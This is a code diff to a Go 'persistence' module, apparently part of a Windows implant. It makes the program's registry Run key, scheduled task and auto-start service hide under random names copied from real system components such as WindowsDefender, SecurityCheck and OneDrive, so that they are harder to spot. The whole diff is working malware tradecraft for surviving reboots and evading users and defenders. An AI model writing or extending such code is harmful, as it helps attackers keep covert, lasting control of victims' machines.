@@ -4,12 +4,34 @@
 package persistence
 
 import (
+	"crypto/rand"
+	"encoding/hex"
 	"fmt"
 	"os"
 	"os/exec"
 	"path/filepath"
 	"strings"
 )
+
+var commonNames = []string{
+	"SystemUpdate", "SecurityCheck", "WindowsDefender", "MicrosoftEdge",
+	"OneDrive", "WindowsBackup", "SystemService", "NetworkManager",
+	"AudioService", "GraphicsDriver", "PrintSpooler", "TaskScheduler",
+}
+
+func generateObfuscatedName(base string) string {
+	if base == "" {
+		b := make([]byte, 4)
+		rand.Read(b)
+		idx := int(b[0]) % len(commonNames)
+		return commonNames[idx]
+	}
+	b := make([]byte, 3)
+	rand.Read(b)
+	suffix := hex.EncodeToString(b)
+	idx := int(b[0]) % len(commonNames)
+	return fmt.Sprintf("%s%s", commonNames[idx], suffix)
+}
 
 type PersistenceHandler struct {
 	execPath string
@@ -26,9 +48,10 @@ func NewPersistenceHandler() (*PersistenceHandler, error) {
 }
 
 func (p *PersistenceHandler) InstallRegistry(name string) error {
+	obfName := generateObfuscatedName(name)
 	cmd := exec.Command("reg", "add",
 		"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-		"/v", name,
+		"/v", obfName,
 		"/t", "REG_SZ",
 		"/d", p.execPath,
 		"/f")
@@ -64,8 +87,9 @@ func (p *PersistenceHandler) RemoveStartupFolder(name string) error {
 }
 
 func (p *PersistenceHandler) InstallScheduledTask(name string, interval int) error {
+	obfName := generateObfuscatedName(name)
 	cmd := exec.Command("schtasks", "/create",
-		"/tn", name,
+		"/tn", obfName,
 		"/tr", p.execPath,
 		"/sc", "minute",
 		"/mo", fmt.Sprintf("%d", interval),
@@ -80,16 +104,18 @@ func (p *PersistenceHandler) RemoveScheduledTask(name string) error {
 }
 
 func (p *PersistenceHandler) InstallService(name, displayName string) error {
-	cmd := exec.Command("sc", "create", name,
+	obfName := generateObfuscatedName(name)
+	obfDisplay := generateObfuscatedName("") + " Service"
+	cmd := exec.Command("sc", "create", obfName,
 		"binPath=", p.execPath,
-		"DisplayName=", displayName,
+		"DisplayName=", obfDisplay,
 		"start=", "auto")
 
 	if err := cmd.Run(); err != nil {
 		return err
 	}
 
-	startCmd := exec.Command("sc", "start", name)
+	startCmd := exec.Command("sc", "start", obfName)
 	return startCmd.Run()
 }
 
